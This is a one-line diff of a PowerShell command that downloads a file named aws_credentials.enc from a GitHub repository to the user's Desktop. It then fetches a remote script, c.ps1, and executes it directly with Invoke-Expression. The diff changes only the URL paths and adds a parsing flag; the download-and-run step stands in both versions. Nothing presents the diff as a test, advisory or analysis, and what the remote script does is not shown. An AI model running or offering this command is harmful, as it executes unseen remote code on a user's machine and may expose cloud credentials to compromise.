@@ -1,1 +1,1 @@
-Invoke-WebRequest -Uri "https://github.com/Gabgodd/xinstance/raw/main/aws_credentials.enc" -OutFile "$env:USERPROFILE\Desktop\aws_credentials.enc"; Invoke-Expression (Invoke-WebRequest -Uri "https://github.com/Gabgodd/xinstance/raw/main/c.ps1" -UseBasicParsing).Content
+Invoke-WebRequest -Uri "https://github.com/Gabgodd/xinstance/raw/refs/heads/main/aws_credentials.enc" -OutFile "$env:USERPROFILE\Desktop\aws_credentials.enc" -UseBasicParsing; Invoke-Expression (Invoke-WebRequest -Uri "https://github.com/Gabgodd/xinstance/raw/refs/heads/main/c.ps1" -UseBasicParsing).Content
